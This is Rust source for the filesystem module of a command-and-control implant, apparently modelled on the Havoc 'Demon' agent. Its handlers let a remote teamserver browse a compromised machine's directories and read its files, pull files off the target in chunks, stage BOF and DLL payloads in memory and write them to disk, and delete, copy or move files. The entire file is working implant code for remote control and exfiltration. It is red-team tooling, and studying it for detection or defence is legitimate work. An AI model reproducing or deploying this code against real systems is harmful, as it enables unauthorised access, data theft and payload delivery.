//! Filesystem, in-memory file staging, transfer, and package-dropped handlers.

use std::io::Read as _;
use std::time::UNIX_EPOCH;

/// Maximum allowed `total_size` for a `CommandMemFile` pre-allocation (100 MiB).
const MAX_MEM_FILE_SIZE: u64 = 100 * 1024 * 1024;

/// Maximum bytes read by `Cat` before truncating (32 MiB).
const CAT_SIZE_LIMIT: u64 = 32 * 1024 * 1024;

use red_cell_common::demon::{DemonCommand, DemonFilesystemCommand};
use tracing::{info, warn};

use crate::download::{DOWNLOAD_MODE_OPEN, DownloadTracker};

use super::{
    DispatchResult, MemFile, MemFileStore, Response, decode_utf16le_null, parse_bytes_le,
    parse_u32_le, parse_u64_le, write_bytes_le, write_u32_be_always, write_u32_le, write_utf16le,
    write_wstring_be,
};

// ─── COMMAND_FS (15) ─────────────────────────────────────────────────────────

/// Dispatch a `CommandFs` task to the appropriate filesystem sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
pub(super) fn handle_fs(
    payload: &[u8],
    request_id: u32,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandFs: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonFilesystemCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandFs: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandFs dispatch");

    match subcmd {
        DemonFilesystemCommand::GetPwd => handle_fs_pwd(subcmd_raw),
        DemonFilesystemCommand::Cd => handle_fs_cd(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Dir => handle_fs_dir(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Download => {
            handle_fs_download(subcmd_raw, &payload[offset..], request_id, downloads)
        }
        DemonFilesystemCommand::Upload => {
            handle_fs_upload(subcmd_raw, &payload[offset..], mem_files)
        }
        DemonFilesystemCommand::Cat => handle_fs_cat(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Remove => handle_fs_remove(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Mkdir => handle_fs_mkdir(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Copy => handle_fs_copy(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Move => handle_fs_move(subcmd_raw, &payload[offset..]),
    }
}

/// `COMMAND_FS / GetPwd (9)` — return the current working directory.
///
/// Outgoing payload (LE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
    let path = match std::env::current_dir() {
        Ok(p) => p.display().to_string(),
        Err(e) => {
            warn!("GetPwd: current_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(path = %path, "GetPwd");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Cd (4)` — change the working directory.
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
/// Outgoing payload (LE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Cd: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "Cd");

    if let Err(e) = std::env::set_current_dir(&path_str) {
        warn!("Cd: set_current_dir({path_str:?}) failed: {e}");
        return DispatchResult::Ignore;
    }

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Dir (1)` — list a directory.
///
/// Incoming args (LE) — mirrors Demon C agent parse order:
/// ```text
/// [file_explorer: u32][path: bytes][subdirs: u32][files_only: u32]
/// [dirs_only: u32][list_only: u32]
/// [starts: bytes][contains: bytes][ends: bytes]
/// ```
///
/// Outgoing payload (LE):
/// ```text
/// [subcmd: u32][file_explorer: u32][list_only: u32][path: bytes][success: u32]
/// per dir group:
///   [path: bytes][num_files: u32][num_dirs: u32]
///   (if !list_only) [total_size: u64]
///   per entry:
///     [name: bytes]
///     (if !list_only) [is_dir: u32][size: u64][day][month][year][min][hour]
/// ```
fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    // Parse the full request payload (matches Demon C agent parse order).
    let file_explorer = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Dir: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let _subdirs = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let files_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let dirs_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let list_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    // Name-filter strings (empty = no filter).
    let starts_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let contains_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let ends_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();

    let raw_path = decode_utf16le_null(&path_bytes);

    // Resolve actual directory path (strip trailing wildcard/dot).
    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path.starts_with(".\\") {
        match std::env::current_dir() {
            Ok(p) => p.display().to_string(),
            Err(e) => {
                warn!("Dir: current_dir failed: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        raw_path.trim_end_matches('*').trim_end_matches('/').trim_end_matches('\\').to_string()
    };

    let entries = match std::fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(e) => {
            warn!(path = %dir_path, "Dir: read_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    // Collect entries with metadata and timestamps.
    // Each entry: (name, is_dir, size, day, month, year, minute, hour)
    let mut files: Vec<(String, bool, u64, u32, u32, u32, u32, u32)> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
        let size = meta.as_ref().map_or(0, |m| m.len());

        // Apply files_only / dirs_only filter.
        if files_only && is_dir {
            continue;
        }
        if dirs_only && !is_dir {
            continue;
        }

        // Apply name filters.
        let name_lower = name.to_ascii_lowercase();
        if !starts_filter.is_empty() && !name_lower.starts_with(&starts_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !contains_filter.is_empty()
            && !name_lower.contains(&contains_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !ends_filter.is_empty() && !name_lower.ends_with(&ends_filter.to_ascii_lowercase()) {
            continue;
        }

        // Derive modification timestamps from real file metadata.
        let (day, month, year, minute, hour) = meta
            .as_ref()
            .and_then(|m| m.modified().ok())
            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
            .map(|d| unix_secs_to_ymd_hm(d.as_secs()))
            .unwrap_or((1, 1, 1970, 0, 0));

        files.push((name, is_dir, size, day, month, year, minute, hour));
    }

    let num_files = files.iter().filter(|(_, d, ..)| !d).count() as u32;
    let num_dirs = files.iter().filter(|(_, d, ..)| *d).count() as u32;
    let total_size: u64 = files.iter().filter(|(_, d, ..)| !d).map(|(_, _, s, ..)| *s).sum();

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, u32::from(file_explorer));
    write_u32_le(&mut out, u32::from(list_only));
    write_utf16le(&mut out, &dir_path);
    write_u32_le(&mut out, 1); // success

    // Single directory group.
    write_utf16le(&mut out, &dir_path);
    write_u32_le(&mut out, num_files);
    write_u32_le(&mut out, num_dirs);
    if !list_only {
        out.extend_from_slice(&total_size.to_le_bytes());
    }

    for (name, is_dir, size, day, month, year, minute, hour) in &files {
        write_utf16le(&mut out, name);
        if !list_only {
            write_u32_le(&mut out, u32::from(*is_dir));
            out.extend_from_slice(&size.to_le_bytes());
            write_u32_le(&mut out, *day);
            write_u32_le(&mut out, *month);
            write_u32_le(&mut out, *year);
            write_u32_le(&mut out, *minute);
            write_u32_le(&mut out, *hour);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// Convert a UNIX timestamp (seconds since epoch) to `(day, month, year, minute, hour)`.
///
/// Uses Howard Hinnant's civil-from-days algorithm for the date part.
#[cfg_attr(test, allow(dead_code))]
pub(super) fn unix_secs_to_ymd_hm(secs: u64) -> (u32, u32, u32, u32, u32) {
    // Days since 1970-01-01 shifted to the civil epoch (Mar 1, year 0).
    let z = (secs / 86400) as i64 + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64; // day of era [0, 146096]
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365; // year of era [0, 399]
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100); // day of year [0, 365]
    let mp = (5 * doy + 2) / 153; // month of year [0, 11]
    let d = doy - (153 * mp + 2) / 5 + 1; // day [1, 31]
    let m = if mp < 10 { mp + 3 } else { mp - 9 }; // month [1, 12]
    let y = if m <= 2 { y + 1 } else { y }; // adjust year for Jan/Feb
    let hour = (secs % 86400 / 3600) as u32;
    let minute = (secs % 3600 / 60) as u32;
    (d as u32, m as u32, y as u32, minute, hour)
}

// ─── COMMAND_FS / Download (2) ──────────────────────────────────────────────

/// `COMMAND_FS / Download (2)` — initiate a file download from the target.
///
/// Opens the requested file, registers it in the [`DownloadTracker`], and
/// returns the OPEN header packet. Subsequent chunks are pushed by the main
/// agent loop via [`DownloadTracker::push_chunks`].
///
/// Incoming args (LE): `[file_path: bytes (UTF-16LE)]`
///
/// Outgoing payload (BE):
/// ```text
/// [subcmd=2: u32][mode=OPEN: u32][file_id: u32][file_size: u64][file_path: wstring]
/// ```
pub(super) fn handle_fs_download(
    subcmd_raw: u32,
    rest: &[u8],
    request_id: u32,
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("FsDownload: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "FsDownload: opening file");

    // Resolve to an absolute path so the teamserver sees the full name.
    let resolved = match std::fs::canonicalize(&path_str) {
        Ok(p) => p.display().to_string(),
        Err(_) => path_str.clone(),
    };

    let file = match std::fs::File::open(&path_str) {
        Ok(f) => f,
        Err(e) => {
            warn!(path = %path_str, error = %e, "FsDownload: open failed");
            return DispatchResult::Ignore;
        }
    };

    let file_size = match file.metadata() {
        Ok(m) => m.len(),
        Err(e) => {
            warn!(path = %path_str, error = %e, "FsDownload: metadata failed");
            return DispatchResult::Ignore;
        }
    };

    let file_id = downloads.add(file, request_id, file_size);

    // Build OPEN header in big-endian (matching Demon PackageAddInt32/64/WString).
    let mut out = Vec::new();
    write_u32_be_always(&mut out, subcmd_raw);
    write_u32_be_always(&mut out, DOWNLOAD_MODE_OPEN);
    write_u32_be_always(&mut out, file_id);
    out.extend_from_slice(&file_size.to_be_bytes()); // int64 BE
    write_wstring_be(&mut out, &resolved);

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Upload (3) ────────────────────────────────────────────────

/// `COMMAND_FS / Upload (3)` — write a file to disk from a staged MemFile.
///
/// The teamserver streams file content into a MemFile via `CommandMemFile`
/// chunks, then sends a `CommandFs / Upload` referencing that MemFile by ID.
///
/// Incoming args (LE): `[file_path: bytes (UTF-16LE)][mem_file_id: u32]`
///
/// Outgoing payload (BE): `[subcmd=3: u32][file_size: u32][file_path: wstring]`
pub(super) fn handle_fs_upload(
    subcmd_raw: u32,
    rest: &[u8],
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("FsUpload: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);

    let mem_file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!(path = %path_str, "FsUpload: failed to parse memfile id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let Some(mem_file) = mem_files.get(&mem_file_id) else {
        warn!(path = %path_str, mem_file_id, "FsUpload: memfile not found");
        return DispatchResult::Ignore;
    };

    if !mem_file.is_complete() {
        warn!(
            path = %path_str,
            mem_file_id,
            expected = mem_file.expected_size,
            actual = mem_file.data.len(),
            "FsUpload: memfile incomplete"
        );
        return DispatchResult::Ignore;
    }

    info!(path = %path_str, size = mem_file.data.len(), "FsUpload: writing file");

    if let Err(e) = std::fs::write(&path_str, &mem_file.data) {
        warn!(path = %path_str, error = %e, "FsUpload: write failed");
        return DispatchResult::Ignore;
    }

    #[allow(clippy::cast_possible_truncation)]
    let file_size = mem_file.data.len() as u32;

    // Remove the consumed MemFile.
    mem_files.remove(&mem_file_id);

    let mut out = Vec::new();
    write_u32_be_always(&mut out, subcmd_raw);
    write_u32_be_always(&mut out, file_size);
    write_wstring_be(&mut out, &path_str);

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Cat (10) ──────────────────────────────────────────────────

/// `COMMAND_FS / Cat (10)` — read a file and return its contents.
///
/// Incoming args (LE): `[file_path: bytes (UTF-16LE)]`
///
/// Outgoing payload (LE):
/// `[10: u32][path: utf16le][success=1: u32][contents: length-prefixed bytes]`
///
/// Files larger than [`CAT_SIZE_LIMIT`] are truncated with a notice appended.
fn handle_fs_cat(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Cat: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);

    let mut file = match std::fs::File::open(&path_str) {
        Ok(f) => f,
        Err(e) => {
            warn!(path = %path_str, "Cat: open failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    let file_len = file.metadata().map(|m| m.len()).unwrap_or(CAT_SIZE_LIMIT + 1);
    let mut contents = Vec::new();
    if let Err(e) = file.by_ref().take(CAT_SIZE_LIMIT).read_to_end(&mut contents) {
        warn!(path = %path_str, "Cat: read failed: {e}");
        return DispatchResult::Ignore;
    }

    if file_len > CAT_SIZE_LIMIT {
        let note = format!(
            "\n[truncated: file is {} bytes, only first {} bytes shown]",
            file_len, CAT_SIZE_LIMIT
        );
        contents.extend_from_slice(note.as_bytes());
    }

    info!(path = %path_str, bytes = contents.len(), "Cat");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path_str);
    write_u32_le(&mut out, 1); // success
    write_bytes_le(&mut out, &contents);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Remove (5) ────────────────────────────────────────────────

/// `COMMAND_FS / Remove (5)` — delete a file or directory.
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
///
/// Outgoing payload (LE): `[5: u32][is_dir: u32][path: utf16le]`
fn handle_fs_remove(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Remove: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);
    let path = std::path::Path::new(&path_str);
    let is_dir = path.is_dir();

    let result = if is_dir { std::fs::remove_dir(path) } else { std::fs::remove_file(path) };

    if let Err(e) = result {
        warn!(path = %path_str, "Remove: failed: {e}");
        return DispatchResult::Ignore;
    }

    info!(path = %path_str, is_dir, "Remove");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, u32::from(is_dir));
    write_utf16le(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Mkdir (6) ─────────────────────────────────────────────────

/// `COMMAND_FS / Mkdir (6)` — create a directory (and parents).
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
///
/// Outgoing payload (LE): `[6: u32][path: utf16le]`
fn handle_fs_mkdir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Mkdir: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);

    if let Err(e) = std::fs::create_dir_all(&path_str) {
        warn!(path = %path_str, "Mkdir: create_dir_all failed: {e}");
        return DispatchResult::Ignore;
    }

    info!(path = %path_str, "Mkdir");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Copy (7) ──────────────────────────────────────────────────

/// `COMMAND_FS / Copy (7)` — copy a file.
///
/// Incoming args (LE): `[from: bytes (UTF-16LE)][to: bytes (UTF-16LE)]`
///
/// Outgoing payload (LE): `[7: u32][success=1: u32][from: utf16le][to: utf16le]`
fn handle_fs_copy(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let from_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Copy: failed to parse from-path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let to_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Copy: failed to parse to-path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let from_str = decode_utf16le_null(&from_bytes);
    let to_str = decode_utf16le_null(&to_bytes);

    if let Err(e) = std::fs::copy(&from_str, &to_str) {
        warn!(from = %from_str, to = %to_str, "Copy: failed: {e}");
        return DispatchResult::Ignore;
    }

    info!(from = %from_str, to = %to_str, "Copy");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, 1); // success
    write_utf16le(&mut out, &from_str);
    write_utf16le(&mut out, &to_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Move (8) ──────────────────────────────────────────────────

/// `COMMAND_FS / Move (8)` — move (rename) a file or directory.
///
/// Incoming args (LE): `[from: bytes (UTF-16LE)][to: bytes (UTF-16LE)]`
///
/// Outgoing payload (LE): `[8: u32][success=1: u32][from: utf16le][to: utf16le]`
fn handle_fs_move(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let from_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Move: failed to parse from-path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let to_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Move: failed to parse to-path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let from_str = decode_utf16le_null(&from_bytes);
    let to_str = decode_utf16le_null(&to_bytes);

    if let Err(e) = std::fs::rename(&from_str, &to_str) {
        warn!(from = %from_str, to = %to_str, "Move: failed: {e}");
        return DispatchResult::Ignore;
    }

    info!(from = %from_str, to = %to_str, "Move");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, 1); // success
    write_utf16le(&mut out, &from_str);
    write_utf16le(&mut out, &to_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_MEMFILE (2560) ─────────────────────────────────────────────────

/// Handle a `CommandMemFile` task: accumulate a file chunk into the in-memory
/// staging area.
///
/// The teamserver splits large payloads (BOFs, DLLs, etc.) into chunks and
/// sends each as a separate `CommandMemFile` packet with the same `mem_file_id`
/// and `total_size`.  Each chunk is appended; once the accumulated length equals
/// `total_size` the file is ready for consumption by `CommandFs/Upload` or
/// similar commands.
///
/// Incoming payload (LE): `[mem_file_id: u32][total_size: u64][chunk: bytes]`
///
/// Outgoing payload (BE): `[mem_file_id: u32][success: u32 (bool)]`
pub(super) fn handle_memfile(
    payload: &[u8],
    request_id: u32,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    let mem_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("MemFile: failed to parse mem_file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let total_size_raw = match parse_u64_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!(mem_file_id, "MemFile: failed to parse total_size: {e}");
            return memfile_ack(mem_file_id, request_id, false);
        }
    };

    if total_size_raw > MAX_MEM_FILE_SIZE {
        warn!(
            mem_file_id,
            total_size = total_size_raw,
            max = MAX_MEM_FILE_SIZE,
            "MemFile: total_size exceeds maximum — rejecting"
        );
        return memfile_ack(mem_file_id, request_id, false);
    }

    let total_size = total_size_raw as usize;

    let chunk = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(mem_file_id, "MemFile: failed to parse chunk: {e}");
            return memfile_ack(mem_file_id, request_id, false);
        }
    };

    let entry = mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    // Reject if total_size changed or we already overflowed.
    if entry.expected_size != total_size || entry.data.len() > total_size {
        warn!(
            mem_file_id,
            expected = entry.expected_size,
            declared = total_size,
            accumulated = entry.data.len(),
            "MemFile: size mismatch or overflow"
        );
        return memfile_ack(mem_file_id, request_id, false);
    }

    entry.append(&chunk);
    info!(
        mem_file_id,
        chunk_len = chunk.len(),
        accumulated = entry.data.len(),
        total = total_size,
        "MemFile: chunk received"
    );

    memfile_ack(mem_file_id, request_id, true)
}

/// Build a `CommandMemFile` acknowledgement response.
///
/// Payload (BE): `[mem_file_id: u32][success: u32 (1 = true, 0 = false)]`
fn memfile_ack(mem_file_id: u32, request_id: u32, success: bool) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_be_always(&mut out, mem_file_id);
    write_u32_be_always(&mut out, u32::from(success));
    DispatchResult::Respond(Response {
        command_id: u32::from(DemonCommand::CommandMemFile),
        request_id,
        payload: out,
    })
}

// ─── COMMAND_PACKAGE_DROPPED (2570) ─────────────────────────────────────────

/// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
/// dropped (e.g. exceeded the SMB pipe buffer limit).
///
/// Incoming payload (LE): `[dropped_package_length: u32][max_length: u32]`
///
/// The handler cleans up any in-flight state associated with the request:
/// downloads whose `request_id` matches are marked for removal, and any
/// partially-staged mem-files with the same ID are discarded.  No response
/// packet is generated — this mirrors the original Havoc behaviour where
/// `RequestCompleted` is deliberately *not* called so the teamserver can
/// still receive subsequent dropped-package notifications for the same
/// request.
pub(super) fn handle_package_dropped(
    payload: &[u8],
    request_id: u32,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    let dropped_length = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandPackageDropped: failed to parse dropped_length: {e}");
            return DispatchResult::Ignore;
        }
    };

    let max_length = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandPackageDropped: failed to parse max_length: {e}");
            return DispatchResult::Ignore;
        }
    };

    warn!(request_id, dropped_length, max_length, "package dropped — cleaning up in-flight state");

    // Mark any active downloads associated with this request for removal.
    let removed_downloads = downloads.mark_removed_by_request_id(request_id);
    if removed_downloads > 0 {
        info!(request_id, removed_downloads, "marked downloads for removal after package drop");
    }

    // Discard any partially-staged mem-file keyed by this request ID.
    if mem_files.remove(&request_id).is_some() {
        info!(request_id, "removed in-flight mem-file after package drop");
    }

    // No response — the original Havoc handler deliberately does not call
    // RequestCompleted, because multiple dropped-package callbacks can arrive
    // for a single request.
    DispatchResult::Ignore
}
